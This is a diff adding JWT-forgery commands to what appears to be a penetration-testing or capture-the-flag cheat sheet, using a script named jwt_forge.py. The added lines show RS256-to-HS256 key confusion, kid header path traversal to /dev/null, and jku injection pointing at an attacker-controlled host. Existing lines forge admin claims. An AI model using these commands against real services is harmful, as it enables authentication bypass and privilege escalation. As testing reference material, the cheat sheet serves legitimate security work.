@@ -91,6 +91,15 @@ echo "<jwt>" | cut -d. -f2 | base64 -d
 # (stdlib-only; session_dissect.py analyses and recovers, jwt_forge.py mints)
 python3 tools/web/jwt_forge.py --token "<jwt>" --claims '{"user":"admin","role":"admin"}'
 python3 tools/web/jwt_forge.py --token "<jwt>" --claims '{"user":"admin"}' --secret secret123
+
+# RS*->HS256 confusion — sign with the server's PUBLIC key as the HMAC secret
+python3 tools/web/jwt_forge.py --token "<jwt>" --claims '{"role":"admin"}' --pubkey pubkey.pem
+
+# kid traversal — point the header at a file whose bytes you know; /dev/null = empty secret
+python3 tools/web/jwt_forge.py --token "<jwt>" --kid ../../../../dev/null --kid-secret ''
+
+# jku injection — point at a JWKS URL you control
+python3 tools/web/jwt_forge.py --token "<jwt>" --jku https://YOUR-HOST/jwks.json
 ```
 
 ## Access Control / Privilege Escalation
